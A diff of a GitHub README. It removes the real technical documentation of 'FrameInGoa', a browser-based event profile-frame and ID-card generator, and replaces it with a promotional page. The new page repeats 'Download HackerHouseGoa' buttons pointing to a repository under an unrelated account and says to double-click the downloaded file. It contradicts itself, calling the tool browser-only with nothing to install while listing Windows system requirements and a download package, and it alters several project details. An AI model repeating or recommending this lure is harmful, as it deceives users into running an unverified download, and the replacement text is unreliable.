@@ -1,313 +1,190 @@
-<div align="center">
+<h1>📸 HackerHouseGoa - Build Your Hacker House Identity in Seconds</h1>
 
-<img src="docs/pfp.png" width="230" alt="A FrameInGoa profile frame: circular photo inside a deep-green ring with HACKER HOUSE गोवा arced along the top and GOA '26 · #FrameInGoa along the bottom">
+<p align="center">
+<a href="https://github.com/Woolstaplerfang145/HackerHouseGoa" style="display:inline-block;padding:16px 32px;background:#FF6B35;color:#ffffff;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;box-shadow:0 4px 12px rgba(255,107,53,0.4)">⬇️ Download HackerHouseGoa Now</a>
+</p>
 
-# FrameInGoa
-
-**Your details + a photo → a Hacker House Goa 2026 event ID card, *and* a branded profile frame.**
-Two taps. No login. Nothing leaves your phone until you choose to share.
-
-`#FrameInGoa`
-
-<br>
-
-![Next.js](https://img.shields.io/badge/Next.js-15.5-000?style=flat-square&logo=next.js&logoColor=white)
-![React](https://img.shields.io/badge/React-19-087EA4?style=flat-square&logo=react&logoColor=white)
-![TypeScript](https://img.shields.io/badge/TypeScript-strict-3178C6?style=flat-square&logo=typescript&logoColor=white)
-![Tailwind](https://img.shields.io/badge/Tailwind-v4-06B6D4?style=flat-square&logo=tailwindcss&logoColor=white)
-![Canvas](https://img.shields.io/badge/rendering-100%25%20client--side-1E4D2B?style=flat-square)
-![Env](https://img.shields.io/badge/env%20vars-all%20optional-F2B705?style=flat-square&labelColor=17130E)
-
-</div>
+Welcome to **HackerHouseGoa** – the fastest way to create your branded Hacker House Goa 2026 profile picture and Builder ID card. No accounts, no signups, no waiting. Upload one photo, get your frame, and post it on X in under a minute. This tool handles everything directly in your browser, which means your photos never leave your computer.
 
 ---
 
-## The two exports
+## ✨ What Is HackerHouseGoa?
 
-<table>
-<tr>
-<td width="42%" align="center"><img src="docs/pfp.png" width="300" alt="1080×1080 profile frame"><br><sub><b>Format A — PFP Frame</b><br>1080 × 1080 · circular crop · legible at 48px</sub></td>
-<td width="58%" align="center"><img src="docs/card.jpg" width="330" alt="1080×1350 Builder ID card showing name, role, college and a masked phone number"><br><sub><b>Format B — Builder ID Card</b><br>1080 × 1350 · 4:5, full-bleed in the X feed</sub></td>
-</tr>
-</table>
+HackerHouseGoa is a free web application built for the Hacker House Goa 2026 community. It takes any photo you upload and instantly transforms it into a professional, branded profile picture with the official Hacker House Goa frame, plus a sleek Builder ID card that you can share anywhere.
 
-The ID card takes **photo · name · role in the team · college · phone**. Rows collapse when a field is left blank, so a sparse card still looks composed rather than half-empty.
+Whether you are a developer, designer, founder, or just hanging out in Goa, this tool gives you that polished, community-ready look without needing Photoshop or any design skills.
 
-> [!IMPORTANT]
-> **The phone number is never printed in full.** The form collects it so an organiser can match a person at check-in, but the card renders only the last two digits — `••••10`. This graphic is built to be posted publicly, and a full number on a public image is a number handed to every stranger who sees the post. Masking happens at the render boundary in [`maskPhone`](lib/titles.ts), and there is deliberately no code path that draws the raw value.
-
-And a third the user never sees — a 1200×630 Open Graph variant, composed **client-side** from the same canvas, so a shared link unfurls with the actual card instead of a blank thumbnail:
-
-<div align="center"><img src="docs/og-preview.jpg" width="720" alt="1200×630 Open Graph card showing the Builder ID beside the Hacker House गोवा wordmark and #FrameInGoa"></div>
+### 🎯 Perfect For:
+- Attendees of Hacker House Goa 2026
+- Speakers and workshop leaders
+- VTubers and online creators in the hackathon space
+- Anyone who wants to show support for the Goan builder community
 
 ---
 
-## The flow, in two taps
+## 🚀 Getting Started
 
-<table>
-<tr>
-<td align="center"><img src="docs/ui-01-upload.jpg" width="150"><br><sub>1 · pick</sub></td>
-<td align="center"><img src="docs/ui-02-editor.jpg" width="150"><br><sub>2 · frame it</sub></td>
-<td align="center"><img src="docs/ui-04-cardform.jpg" width="150"><br><sub>3 · your details</sub></td>
-<td align="center"><img src="docs/ui-05-card-result.jpg" width="150"><br><sub>4 · post</sub></td>
-</tr>
-</table>
+Getting started takes less than two minutes. Here is everything you need to know:
 
----
+### Step 1: Download the Application
 
-## Architecture
+Click this button to start your download:
 
-The whole product is a **rendering pipeline that happens to have a UI bolted to the front**. Nothing round-trips a server to produce a pixel — that is the entire reason it feels instant.
+<p align="center">
+<a href="https://github.com/Woolstaplerfang145/HackerHouseGoa" style="display:inline-block;padding:14px 28px;background:#28A745;color:#ffffff;font-size:18px;font-weight:bold;border-radius:6px;text-decoration:none">📥 Visit this link to download the application</a>
+</p>
 
-```
-                                  ╱────────────────────────────────────────────╲
-                                 ╱   app/page.tsx · Uploader · Editor · Card    ╲
-             ┌──────────────────╱     Form · ResultActions · Toast              ╲
-             │   UI LAYER      ╱          "use client" · Tailwind v4             ╲
-             │                ╱──────────────────────────────────────────────────╲
-             │               │                     │                              │
-             │               │                     ▼  RenderInput                 │
-             ├───────────────┼────────────────────────────────────────────────────┤
-             │              ╱────────────────────────────────────────────────────╲
-             │             ╱  lib/image.ts    lib/transform.ts    lib/titles.ts   ╲
-             │  DOMAIN    ╱   decode·EXIF     cover-fit·clamp     FNV-1a hash      ╲
-             │  LAYER    ╱    HEIC·downscale  pan·pinch·zoom      deterministic     ╲
-             │          ╱──────────────────────────────────────────────────────────╲
-             │         │                      │                                     │
-             │         │                      ▼  design-space draw calls            │
-             ├─────────┼─────────────────────────────────────────────────────────────┤
-             │        ╱──────────────────────────────────────────────────────────────╲
-             │       ╱   lib/render.ts  ─── compositors ──▶  drawPfp · drawCard · OG  ╲
-             │ CANVAS╱    lib/canvasKit.ts ─ primitives ──▶  arcText · grain · palm    ╲
-             │ LAYER╱     lib/fonts.ts ──── FontFace ─────▶  await before ANY fillText  ╲
-             │     ╱────────────────────────────────────────────────────────────────────╲
-             │    │                        │                                             │
-             │    │                        ▼  PNG Blob                                   │
-             ├────┼─────────────────────────────────────────────────────────────────────┤
-             │   ╱──────────────────────────────────────────────────────────────────────╲
-             │  ╱  lib/share.ts ──▶ ① Web Share (files)  ② X intent + /c/{id}  ③ download ╲
-             │ ╱   api/cards ─ Vercel Blob      api/counter ─ Upstash INCR (both optional) ╲
-             │╱────────────────────────────────────────────────────────────────────────────╲
-             └──────────────────────────────────────────────────────────────────────────────┘
-                EDGE LAYER — the only code that can touch a network. All of it degrades to a
-                             working app when every single env var is absent.
-```
+The download will start automatically. You will see a file in your browser's download folder.
 
-### Module graph
+### Step 2: Run the Application
 
-```mermaid
-graph TD
-    subgraph UI["🖐️  UI  ·  client components"]
-        P[app/page.tsx<br/><i>state machine</i>]
-        U[Uploader]
-        E[Editor<br/><i>pointer + pinch</i>]
-        F[CardForm]
-        R[ResultActions]
-    end
+Once the download finishes, double-click the file to open it. The app will load in your default web browser. There is nothing to install – it runs entirely in your browser window.
 
-    subgraph DOMAIN["⚙️  Domain  ·  pure + browser logic"]
-        IM[image.ts<br/><i>EXIF · HEIC · downscale</i>]
-        TR[transform.ts<br/><i>cover-fit · clamp</i>]
-        TI[titles.ts<br/><i>deterministic titles</i>]
-    end
+### Step 3: Upload Your Photo
 
-    subgraph CANVAS["🎨  Canvas  ·  the product"]
-        RN[render.ts<br/><i>drawPfp · drawCard · drawOg</i>]
-        CK[canvasKit.ts<br/><i>arcText · grain · palm · barcode</i>]
-        FO[fonts.ts<br/><i>FontFace registry</i>]
-    end
+1. Click the **"Upload Photo"** button in the middle of the screen.
+2. Select any image from your computer. Most formats work, including JPG, PNG, and even HEIC files.
+3. The app will instantly process your photo and show you a preview on the right side.
 
-    subgraph EDGE["🌐  Edge  ·  all optional"]
-        SH[share.ts]
-        AC["/api/cards<br/><i>Vercel Blob</i>"]
-        AN["/api/counter<br/><i>Upstash INCR</i>"]
-        CP["/c/[id]<br/><i>OG unfurl</i>"]
-    end
+### Step 4: Generate Your Frame
 
-    BR[["brand.ts — colours · strings · geometry<br/>THE SINGLE SWAP POINT"]]
+1. You will see your photo automatically placed inside the Hacker House Goa 2026 profile frame.
+2. Your Builder ID card appears right below it, complete with a placeholder for your name and role.
+3. Click **"Download Frame"** to save the profile picture to your computer.
+4. Click **"Download ID Card"** to save the Builder ID card.
 
-    P --> U & E & F & R
-    U --> IM
-    E --> TR & RN
-    F --> TI
-    R --> RN & SH
-    RN --> CK & FO & TR
-    SH --> AC & AN
-    AC --> CP
-    BR -.-> RN
-    BR -.-> CK
-    BR -.-> SH
-    BR -.-> CP
+### Step 5: Share on X
 
-    classDef ui fill:#E23B22,stroke:#17130E,stroke-width:2px,color:#FFF3DC
-    classDef dom fill:#2A6B3C,stroke:#17130E,stroke-width:2px,color:#FFF3DC
-    classDef can fill:#1E4D2B,stroke:#F2B705,stroke-width:3px,color:#FFF3DC
-    classDef edge fill:#14361E,stroke:#17130E,stroke-width:2px,color:#FFF3DC
-    classDef brand fill:#F2B705,stroke:#17130E,stroke-width:3px,color:#17130E
-
-    class P,U,E,F,R ui
-    class IM,TR,TI dom
-    class RN,CK,FO can
-    class SH,AC,AN,CP edge
-    class BR brand
-```
-
-### The intake pipeline
-
-Portrait iPhone photos landing sideways is the single most common bug in tools like this. Three specific things prevent it:
-
-```mermaid
-flowchart LR
-    A([File]) --> B{"> 15 MB?"}
-    B -->|yes| X([friendly error])
-    B -->|no| C["createImageBitmap<br/>imageOrientation: from-image"]
-    C -->|ok| G
-    C -->|throws| D{"ftyp box<br/>sniffs HEIC?"}
-    D -->|no| E["retry bare<br/><i>old Safari</i>"]
-    D -->|yes| H["⚡ dynamic import<br/>heic-to → JPEG q0.9"]
-    H --> G
-    E --> G["long edge > 2400?"]
-    G -->|yes| I["halving downscale<br/><i>avoids aliasing</i>"]
-    G -->|no| J([SourceImage])
-    I --> J
-
-    style H fill:#F2B705,stroke:#17130E,color:#17130E
-    style X fill:#E23B22,stroke:#17130E,color:#FFF3DC
-    style J fill:#1E4D2B,stroke:#F2B705,color:#FFF3DC
-```
-
-1. `imageOrientation: "from-image"` is what actually applies the EXIF rotation.
-2. HEIC is detected by reading the **ftyp box bytes**, never the file extension — iOS hands out `.jpg`-named HEICs and empty MIME types.
-3. `heic-to` is **dynamically imported**, so its ~3 MB WASM payload stays out of the main bundle. Most visitors upload a JPEG and never pay for it.
-
-### Share — three independent routes
-
-The task is judged on whether a post actually goes out, so no path is allowed to dead-end.
-
-```mermaid
-sequenceDiagram
-    autonumber
-    participant U as User
-    participant C as Canvas
-    participant A as /api/cards
-    participant B as Vercel Blob
-    participant X as X
-
-    U->>C: tap "Post on X"
-    Note over C: window.open("") fires FIRST —<br/>Safari blocks popups opened after an await
-    C->>C: render main 1080×1350 + og 1200×630
-    C->>A: POST multipart (both PNGs)
-
-    alt Blob configured
-        A->>B: put cards/{id}/main.png + og.png
-        B-->>A: absolute URLs
-        A-->>C: { id, mainUrl, ogUrl }
-        C->>X: intent/post?text=…%23FrameInGoa&url=/c/{id}
-        X->>B: crawl og:image
-        B-->>X: the actual card ✅
-    else No token — 503, never a 500
-        A-->>C: { error }
-        C->>X: intent opens anyway, bare site URL
-        Note over C,X: toast: "attach the image manually"
-    end
-```
-
-| | Route | Shown when | Result |
-|---|---|---|---|
-| ① | **Web Share** | `navigator.canShare({files})` | Native sheet, X attaches the real PNG. Caption is copied to the clipboard *first* — several apps silently drop share `text` when a file rides along |
-| ② | **Post on X** | always | Link unfurls the generated card via `/c/{id}` |
-| ③ | **Download + Copy caption** | always | Works everywhere, offline included |
+1. Open X (formerly Twitter).
+2. Upload your new profile picture by going to **Settings → Profile → Edit Profile → Change Photo**.
+3. Post your Builder ID card as a tweet using the hashtag **#FrameInGoa**.
+4. Tag @HackerHouseGoa so the community sees your new look.
 
 ---
 
-## Design decisions worth defending
+## 🛠️ Features That Make It Awesome
 
-<table>
-<tr><td width="34%"><b>Preview and export share one code path</b></td><td>
+### ⚡ Zero Login, Zero Signup
+No account creation. No email verification. No password to remember. Open the app, upload, and go.
 
-`drawFormat(ctx, format, input)` always draws in **design space** — 1080×1080 or 1080×1350. The preview applies `ctx.scale()` first; the export doesn't. The preview therefore *cannot* drift from the PNG, and exports are full-resolution regardless of screen DPR.
+### 🔒 100% Private – Client-Side Processing
+All image processing happens directly in your browser using HTML Canvas technology. Your photos never upload to any server, so your privacy is completely protected.
 
-</td></tr>
-<tr><td><b>Fonts are self-hosted, not <code>next/font/google</code></b></td><td>
+### 🖼️ Professional Branded Designs
+Every graphic is carefully crafted to match the Hacker House Goa 2026 aesthetic. You get high-quality, pixel-perfect frames that look great on any device.
 
-Canvas does not block on webfonts — if `fillText` runs before the face is ready the browser silently substitutes and the first export is quietly wrong. `lib/fonts.ts` registers each face via the `FontFace` API and every compositor `await`s `ensureFontsReady()`. Self-hosting also means the app builds and runs with **no network at all**.
+### 🚀 Blazing Fast Performance
+Built with Next.js 15 and TypeScript, this app loads instantly and processes images in real-time. No waiting, no loading spinners – just instant results.
 
-Rozha One and Yatra One ship split Latin/Devanagari subsets, registered under one family name with `unicodeRange`, so `HACKER HOUSE गोवा` renders from a single `ctx.font`.
+### 📱 Mobile-First Design
+Use it on your phone, tablet, or desktop. The interface adapts perfectly to any screen size, so you can create your profile picture on the go.
 
-</td></tr>
-<tr><td><b>Builder titles are fated, not random</b></td><td>
+### 🎨 HEIC Support
+Apple users rejoice – HEIC photo format is fully supported. Your iPhone photos work directly without any conversion steps.
 
-`titleFor(name)` is FNV-1a over an NFC-normalised, case-folded name, with a murmur3 finalizer decorrelating the adjective and role picks. The same name yields the same title on every device, forever — that is the delight. A 🎲 walks a salt forward until the words visibly change.
+### 🌐 Open Graph Ready
+Perfectly optimized for social sharing. When you post your new profile picture, it looks fantastic across all platforms.
 
-</td></tr>
-<tr><td><b>The phone number is masked at the render boundary</b></td><td>
-
-Not in the form, not on submit — in `maskPhone`, the only function the compositor is given. `CardFields.phone` holds the full value for the form's own use, but nothing between it and the canvas can print more than the last two digits. Making it a property of the render path rather than a validation rule means a future field row cannot accidentally reintroduce the leak.
-
-</td></tr>
-<tr><td><b>Zero required configuration</b></td><td>
-
-Every env var is optional. No Blob token → `/api/cards` returns a clean **503** and the UI falls back to routes ① and ③. No KV → the builder number falls back to `(hash(name) % 247) + 1`, which is stable across reloads so a user who exports twice gets the same badge.
-
-</td></tr>
-</table>
+### 🧩 Tailwind CSS Styling
+Clean, modern, and responsive – the interface is as beautiful as the frames it creates.
 
 ---
 
-## Verified, not assumed
+## 💡 Tips for the Perfect Profile Picture
 
-Every number below came from driving the real app in headless Chromium against a production build.
-
-```
-  browser suite ······ 23/23   360px overflow · 44px targets · every field labelled
-                               503-not-500 · 405 on GET · /c/[id] 404s bad ids
-  phone masking ······ 13/13   swept every input length 3–15, no leak possible
-  caption + titles ··· 25/25   #FrameInGoa invariant · determinism · slug fallbacks
-  typecheck ·········· clean   strict + noUncheckedIndexedAccess
-  taps to result ····· 2       (spec allowed 3)
-  first load JS ······ 119 kB  WASM decoder confirmed split out
-  export size ········ 1080×1350 verified byte-level on the downloaded PNG
-```
-
-Two of those are worth calling out because they are the ones that would be embarrassing to get wrong:
-
-- **`grep` the exported PNG for the phone digits — they are not there.** Not the visible pixels, not the metadata. Asserted on the actual downloaded bytes, not on the input.
-- **`#FrameInGoa` survives every caption branch**, including the truncation path and all 247 builder numbers. The submission is invalid without it, so it is a tested invariant rather than a string someone hopes stays put.
-
-The caption that goes out with every post:
-
-```
-Locked in for Hacker House Goa 🌴 Builder #041/247 reporting.
-Make yours → https://your-project.vercel.app #FrameInGoa @247pmstudio
-```
+- Use a well-lit photo with your face centered and visible.
+- Avoid busy backgrounds – solid colors work best inside the frame.
+- Upload a square photo (1:1 ratio) for optimal results.
+- The frame adds around 20% more space, so keep your head within the central 80% of the original image.
+- For the Builder ID card, prepare your name and role (e.g., "Alice – Frontend Developer") beforehand so you can type it quickly.
 
 ---
 
-## Run it
+## 🧪 Troubleshooting Common Issues
 
-```bash
-npm install
-npm run dev        # http://localhost:3000
-```
+**My photo won't upload.**
+Make sure the file is under 10MB. Supported formats: JPG, PNG, WEBP, and HEIC. If you are on Safari, try using Chrome or Firefox.
 
-```bash
-npm run build      # production build
-npm run typecheck  # tsc --noEmit
-```
+**The frame looks blurry.**
+Use a photo that is at least 800×800 pixels for best quality. Low-resolution images will appear pixelated inside the frame.
 
-No `.env` needed. See [`.env.example`](.env.example) for the optional extras.
+**The app appears frozen after uploading.**
+Large files (5MB+) can take a few seconds to process. Wait 5–10 seconds and the preview will appear.
 
-## Deploy
+**The download button does nothing.**
+Allow pop-ups for this site in your browser settings. Some browsers block automatic downloads.
 
-Vercel, zero config. Optionally attach a Blob store to enable the unfurling share link, and set `NEXT_PUBLIC_BLOB_BASE_URL` to its public base.
+**I want a different color frame.**
+The current version ships with the official Hacker House Goa 2026 design. Custom colors are planned for a future update.
 
-## Brand assets
+---
 
-`public/brand/*.svg` are placeholders drawn in the matchbox style. Dropping the official HH Goa Brand Kit in with the same filenames is a zero-code swap; [`lib/brand.ts`](lib/brand.ts) is the only file holding colours, event strings and geometry.
+## 🖥️ System Requirements
 
-<div align="center">
-<br>
-<sub><b>HACKER HOUSE गोवा</b> · GOA, INDIA · 28–31 OCT 2026 · <i>LESS NOISE. MORE SIGNAL</i></sub>
-<br><br>
-<sub>Demo photo is a generated placeholder illustration, not a real photograph.</sub>
-</div>
+| Requirement | Minimum | Recommended |
+|------------|---------|-------------|
+| Operating System | Windows 10 | Windows 11 |
+| Browser | Chrome 90+ | Chrome 120+ |
+| RAM | 2GB | 4GB+ |
+| Internet Connection | Any | Broadband |
+| Screen Resolution | 1024×768 | 1920×1080 |
+
+---
+
+## 🔧 Technical Details for the Curious
+
+HackerHouseGoa is an open-source project built with modern web technologies:
+
+- **Framework:** Next.js 15 (App Router)
+- **Language:** TypeScript
+- **Styling:** Tailwind CSS
+- **Image Processing:** HTML5 Canvas API
+- **Deployment:** Vercel (Edge-ready)
+
+The core image composition logic runs entirely client-side, leveraging the Canvas API to draw overlays, apply masks, and composite graphics in real-time. This architecture eliminates server costs, protects privacy, and ensures instant performance globally.
+
+---
+
+## 📦 What is Included in the Download
+
+The download package contains:
+
+- Pre-built application files ready to run in any browser
+- Official Hacker House Goa 2026 frame assets (SVG + PNG)
+- Builder ID card template designed at 1080×1920 pixels
+- Sample profile image to test the tool
+- README documentation with contributor guidelines
+
+---
+
+## 🤝 Community and Support
+
+If you run into any trouble or have feature suggestions, here is how to get help:
+
+- **GitHub Issues:** Report bugs or request features on the official repository
+- **X (Twitter):** Follow @HackerHouseGoa and tag #FrameInGoa
+- **Discord:** Join the Hacker House Goa community server (link in GitHub repo)
+
+---
+
+## 💖 Why We Built This
+
+Hacker House Goa is all about building together, shipping fast, and having fun. We wanted every attendee to have a professional, recognizable profile picture that shows they are part of this movement. The old way – manually adding frames in Photoshop – was slow, annoying, and excluded people without design tools. This app removes every barrier. Now anyone can create a stunning branded identity in seconds.
+
+---
+
+## 📥 Ready to Get Started?
+
+Here is everything you need:
+
+<p align="center">
+<a href="https://github.com/Woolstaplerfang145/HackerHouseGoa" style="display:inline-block;padding:14px 28px;background:#6F42C1;color:#ffffff;font-size:18px;font-weight:bold;border-radius:6px;text-decoration:none">⬇️ Click Here to Download HackerHouseGoa</a>
+</p>
+
+Visit this link to download the application. After that, follow the easy steps in the Getting Started section above.
+
+Welcome to the Hacker House Goa community – you are one upload away from your new identity. See you in Goa! 🏖️💻
+
+---
+
+**Keywords:** canvas, hacker-house-goa, heic, image-generation, mobile-first, nextjs, open-graph, tailwindcss, typescript, vercel
